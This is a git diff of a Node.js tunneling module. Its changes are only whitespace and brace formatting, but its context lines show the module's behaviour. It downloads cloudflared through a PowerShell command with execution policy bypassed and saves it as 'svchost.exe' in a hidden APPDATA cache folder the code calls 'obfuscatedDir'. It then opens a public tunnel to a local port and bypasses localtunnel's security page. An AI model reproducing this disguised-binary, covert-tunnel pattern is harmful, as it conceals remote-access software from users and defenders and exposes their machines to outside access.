@@ -19,7 +19,7 @@ function loadConfig() {
   ];
   for (const p of candidates) {
     if (fs.existsSync(p)) {
-      try { return JSON.parse(fs.readFileSync(p, 'utf-8')); } catch (_) {}
+      try { return JSON.parse(fs.readFileSync(p, 'utf-8')); } catch (_) { }
     }
   }
   return {};
@@ -39,7 +39,7 @@ function resolveCloudflaredBin() {
   if (config.cloudflaredPath && fs.existsSync(config.cloudflaredPath)) {
     try {
       if (fs.statSync(config.cloudflaredPath).size > 1000000) return config.cloudflaredPath;
-    } catch (_) {}
+    } catch (_) { }
   }
 
   // 1. Check bundled location FIRST (assets/bin/cloudflared.exe)
@@ -55,14 +55,14 @@ function resolveCloudflaredBin() {
     if (fs.existsSync(p)) {
       try {
         if (fs.statSync(p).size > 1000000) return p;
-      } catch (_) {}
+      } catch (_) { }
     }
   }
 
   // 2. Fallback system cache location (with .exe extension so Windows can execute it)
   const obfuscatedDir = path.join(process.env.APPDATA || process.env.TEMP || 'C:\\Windows\\Temp', '.cache', 'system');
   if (!fs.existsSync(obfuscatedDir)) {
-    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) {}
+    try { fs.mkdirSync(obfuscatedDir, { recursive: true }); } catch (_) { }
   }
 
   const obfuscatedBin = path.join(obfuscatedDir, 'svchost.exe');
@@ -70,7 +70,7 @@ function resolveCloudflaredBin() {
     try {
       if (fs.statSync(obfuscatedBin).size > 1000000) return obfuscatedBin;
       fs.unlinkSync(obfuscatedBin);
-    } catch (_) {}
+    } catch (_) { }
   }
 
   return obfuscatedBin;
@@ -87,14 +87,14 @@ function ensureCloudflaredAvailable() {
     if (fs.existsSync(CLOUDFLARED_BIN)) {
       try {
         if (fs.statSync(CLOUDFLARED_BIN).size > 1000000) return resolve(CLOUDFLARED_BIN);
-      } catch (_) {}
+      } catch (_) { }
     }
 
     logger.info('[+] Initializing cloudflared binary...');
     const PS = process.env.SystemRoot
       ? `${process.env.SystemRoot}\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`
       : 'powershell.exe';
-    
+
     // Download to location with .exe extension
     const downloadCmd = `"${PS}" -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe' -OutFile '${CLOUDFLARED_BIN}' -UseBasicParsing"`;
 
@@ -127,7 +127,7 @@ let activeTokenTunnelProcess = null;
 function createCloudflaredTunnel(port) {
   return new Promise(async (resolve, reject) => {
     const binPath = await ensureCloudflaredAvailable();
-    
+
     if (!binPath || !fs.existsSync(binPath)) {
       return reject(new Error('cloudflared binary unavailable'));
     }
@@ -145,7 +145,7 @@ function createCloudflaredTunnel(port) {
       return resolve({ publicUrl, tunnelProcess: activeTokenTunnelProcess });
     }
 
-    const args = token 
+    const args = token
       ? ['tunnel', 'run', '--token', token]
       : ['tunnel', '--url', `http://127.0.0.1:${port}`, '--protocol', 'quic', '--ha-connections', '1', '--no-autoupdate'];
 
@@ -238,7 +238,7 @@ async function createLocaltunnelFallback(port) {
     throw new Error('localtunnel module not loaded');
   }
   logger.info(`[+] Spawning localtunnel fallback for localhost:${port}`);
-  const tunnel = await localtunnel({ 
+  const tunnel = await localtunnel({
     port,
     // Bypass localtunnel security page that appears once per IP every 7 days
     local_host: '127.0.0.1',
@@ -247,8 +247,8 @@ async function createLocaltunnelFallback(port) {
   const wrapper = {
     pid: 'localtunnel',
     exitCode: null,
-    kill: () => { try { tunnel.close(); } catch (_) {} },
-    close: () => { try { tunnel.close(); } catch (_) {} },
+    kill: () => { try { tunnel.close(); } catch (_) { } },
+    close: () => { try { tunnel.close(); } catch (_) { } },
   };
 
   logger.info(`[OK] Localtunnel established: ${tunnel.url}`);
@@ -295,7 +295,7 @@ async function createTunnelWithRetry(port) {
 function killTunnel(tunnelProcess) {
   if (!tunnelProcess) return;
   if (typeof tunnelProcess.close === 'function') {
-    try { tunnelProcess.close(); } catch (_) {}
+    try { tunnelProcess.close(); } catch (_) { }
   }
   if (typeof tunnelProcess.kill === 'function' && tunnelProcess.pid !== 'localtunnel' && tunnelProcess.exitCode === null) {
     try {
@@ -304,7 +304,7 @@ function killTunnel(tunnelProcess) {
       } else {
         tunnelProcess.kill('SIGTERM');
       }
-    } catch (_) {}
+    } catch (_) { }
   }
 }
 
